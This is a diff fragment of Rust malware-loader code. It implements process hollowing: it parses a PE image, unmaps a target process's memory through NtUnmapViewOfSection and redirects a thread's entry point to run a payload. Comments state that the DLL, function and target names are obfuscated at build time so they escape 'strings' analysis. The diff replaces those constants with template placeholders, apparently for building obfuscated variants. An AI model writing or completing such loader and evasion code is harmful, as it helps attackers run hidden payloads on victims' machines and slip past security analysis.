@@ -48,7 +48,7 @@ struct Pe {
 /// `Params::render_fragment` with code that rebuilds the string at runtime, so
 /// it never appears in `strings`.
 fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
-    let hollow_target = HOLLOW_TARGET_DEF;
+    let hollow_target = $HOLLOW_TARGET_DEF$;
     let pe = parse_pe(image)?;
     let process = run_stage_two(&hollow_target, image, &pe)?;
     Ok(wait_and_exit(process))
@@ -326,9 +326,9 @@ fn redirect_entry(thread: HANDLE, base: u64, entry_rva: u32) -> Result<(), Strin
 fn resolve_unmap() -> Result<NtUnmapViewOfSectionFn, String> {
     // The DLL and function names are substituted at build time with code that
     // rebuilds them at runtime (obfuscated), so they do not appear in `strings`.
-    let ntdll = std::ffi::CString::new(NTDLL_DEF).map_err(|_| "invalid ntdll name".to_string())?;
+    let ntdll = std::ffi::CString::new($NTDLL_DEF$).map_err(|_| "invalid ntdll name".to_string())?;
     let unmap =
-        std::ffi::CString::new(UNMAP_FUNC_DEF).map_err(|_| "invalid unmap name".to_string())?;
+        std::ffi::CString::new($UNMAP_FUNC_DEF$).map_err(|_| "invalid unmap name".to_string())?;
 
     let module = unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }
         .map_err(|e| format!("GetModuleHandleA failed: {e}"))?;
